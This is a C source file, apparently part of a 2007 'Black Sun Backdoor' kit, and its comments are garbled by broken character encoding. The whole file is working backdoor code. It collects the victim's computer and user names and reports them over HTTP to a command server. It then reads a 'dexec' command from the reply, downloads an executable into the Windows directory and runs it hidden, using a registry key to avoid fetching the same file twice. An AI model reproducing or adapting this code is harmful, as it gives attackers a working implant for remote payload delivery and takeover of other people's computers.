/*
 *  ---------------------------------------------------------------------
 * 	       ____  _            _     _____             
 * 	      |  _ \| |          | |   / ____|            
 * 	      | |_) | | __ _  ___| | _| (___  _   _ _ __  
 * 	      |  _ <| |/ _` |/ __| |/ /\___ \| | | | '_ \ 
 * 	      | |_) | | (_| | (__|   < ____) | |_| | | | |
 * 	      |____/|_|\__,_|\___|_|\_\_____/ \__,_|_| |_|
 *                 Black Sun Backdoor v1.0 prebeta        
 *
 *                          (x) Cytech 2007
 *
 *  ---------------------------------------------------------------------
 *  [webgate.h]
 *      ������ HTTP-����. ������ �� ����� � ��������� ������.
 *      ������������ ������ ���� �������: dexec (������ � ������ �����)
 *      ���� � ��� �� ���� �� �������� ��������� ���. ��������� � readme
 *  ---------------------------------------------------------------------
 */

// ------------------ [ ������� GET-������ �� ���� � ��������� ������� ] ------------------ //

static DWORD WINAPI ReportToStat(char szData) 
{
  	char recvbuffer[1024], getpack[1024], pcname[256], windirpath[256];
	char *temp, *token[256], *t, *url, *nourl, port[256]; 
	char lasturl[256]={0};
	int i; 
	HKEY hKeyWrite, hKeyRead;
	DWORD lasturlLen = sizeof(lasturl);
	SOCKET httpsock; 
	SOCKADDR_IN httpsocket;
	HRESULT hUdtf;
	
		LPTSTR lpszCompName, lpszUserName; 
		DWORD cchBuff; 
		TCHAR tchBuffer[100]; 
		lpszUserName = tchBuffer; 
		lpszCompName = tchBuffer;
		cchBuff = 256;
		nourl = "nourl";
		fZeroMemory(recvbuffer, sizeof(recvbuffer));
		fMemSet(recvbuffer, 0, 1024);
		
    // �������� ��� ���������� � ������������ (��� �������� ����� � �������� data GET-�������)
	
		GetComputerName(lpszCompName, &cchBuff);
		strcpy(pcname, lpszCompName);
		GetUserName(lpszUserName, &cchBuff);
		strcat(pcname, lpszUserName);
		
    // ��������� ��������� ������
	
	httpsocket.sin_addr.S_un.S_addr = GetIpByHostname(HTTPSERV);
	httpsocket.sin_family = AF_INET;
	httpsocket.sin_port = htons(HTTPPORT);
	
    // ������� HTTP GET-����� ���������� ����:
	//
	//  GET /blacksun/logger.php?data={data} HTTP/1.0
	//  User-Agent: {user-agent}
	//  Host: www.{host}.ru

        itoa(BINDPORT, port, 10);

		lstrcpy(getpack, "GET ");
		lstrcat(getpack, HTTPPATH);
		lstrcat(getpack, "?getcmd=1&uid=");
		lstrcat(getpack, &pcname);
		lstrcat(getpack, "&port=");
		lstrcat(getpack, &port);
		lstrcat(getpack, " HTTP/1.0\r\n");
		lstrcat(getpack, "User-Agent: ");
		lstrcat(getpack, USERAGENT);
		lstrcat(getpack, "\r\nHost: ");
		lstrcat(getpack, HTTPSERV);
		lstrcat(getpack, "\r\n\r\n");
		
    // ������� ����� � �������� ������ 
	
	httpsock = socket(AF_INET,SOCK_STREAM,0);
	connect(httpsock, (struct sockaddr *)&httpsocket, sizeof(httpsocket)); 
	send(httpsock, getpack, lstrlen(getpack),0);
	
	    // �������� ����� �� HTTP-������� 
		
		while(i = recv(httpsock, recvbuffer+lstrlen(recvbuffer), 1, 0))
	 	{
			if (i == SOCKET_ERROR) return -1; 
		}
		
		// ������ ��������� HTTP-����� ���, �� ���� ������� http-header, �������� �����:
		//	HTTP/1.0 200 OK
		//	Date=Sun, 11 Mar 2007 22:57:52 GMT
		//	Server=Apache/1.3.33 (Win32) PHP/4.4.2
		//	X-Powered-By=PHP/4.4.2
		//	RemovedHdr=close
		// 	Content-Type=text/html
		// 
		//  dexec http://cytech/bot.exe
		 
	     for(i = 0; recvbuffer[i]!=0; ++i)
	     {
		          if((recvbuffer[i]=='\r')&&(recvbuffer[i+1]=='\n')
				  &&(recvbuffer[i+2]=='\r')&&(recvbuffer[i+3]=='\n'))
		            {
						temp = (char*)&recvbuffer[i] + 4;
						break;
				    }
	     }
		 
       // ������ ������ ��������, ��������� ����������� �� �����
	if(lstrcmp(temp,"")==0) return 0;
	t = strtok(temp,"�");
	
	
	for(i = 0; t; t = strtok(NULL,"�"), i++)
	{
		token[i] = t; 
//	MessageBox(0, token[i], "", 0); 
	}
	 
	// ------ ��������� ������� dexec (������ � ������� �����) ------ //
	// ������� �������� ���: dexec http://cytech/bot.exe
	
    if(lstrcmp(token[0],"dexec")==0)
	{
		 HRESULT hUdtf;
		 char * url, lasturl;
		 HKEY hk; 
		 lasturl = NULL; 
		 url = token[1];
		  // ��������: ������� �� ���� ��� ���? ���� ���, �� ����� � ������ ����� ��� ���������� ���������� �����. 
	 
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, DATAKEY , 0, KEY_QUERY_VALUE, &hKeyRead)==ERROR_SUCCESS)
	{

		if(RegQueryValueEx(hKeyRead, REGNAME, 0, 0, lasturl, &lasturlLen)==ERROR_SUCCESS)
		{
				if(lstrcmp(url, lasturl)==0)
				{
			//		MessageBox(0, "���� ���� ��� �������", "", 0);
					return FALSE;
				}
			//	else
			//	{
			//		MessageBox(0, "���� �� �������. ������ =)", "", 0);
			//
			//	}
				RegCloseKey(hKeyRead);
		} 
		else 
		{
	  		 //  MessageBox(0, "�������� �� �����������, ������ ������ �� �������, �������", "", 0);
				if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, DATAKEY, 0, KEY_WRITE, &hKeyWrite)==ERROR_SUCCESS)
				{
					RegSetValueEx(hKeyWrite, REGNAME, 0, REG_SZ, url, strlen(url));
					RegCloseKey(hKeyWrite);
					return FALSE; 
				}		
					RegCloseKey(hKeyRead);
					RegCloseKey(hKeyWrite);
		}
	} 
		  // ��������� ���� � ���������... 	
			GetWindowsDirectory(windirpath, 256);
			lstrcat(windirpath,EXENAME);
			LoadLibrary(URLMON_DLL);
			
					__try
					{
						  hUdtf = URLDownloadToFile(NULL, url, windirpath, 0, NULL); 
						  if(hUdtf == S_OK)
						  {
						  
						        if(WinExec(windirpath, SW_HIDE) > 32)
								{								
									return TRUE;
								}
						 	    else return FALSE;
						  }
					}
			    	__except(EXCEPTION_EXECUTE_HANDLER)
					{
						return FALSE;
					}

     }

	// ------ ����� ��������� ������� dexec ------ //
	closesocket(httpsock);
	return 0;

}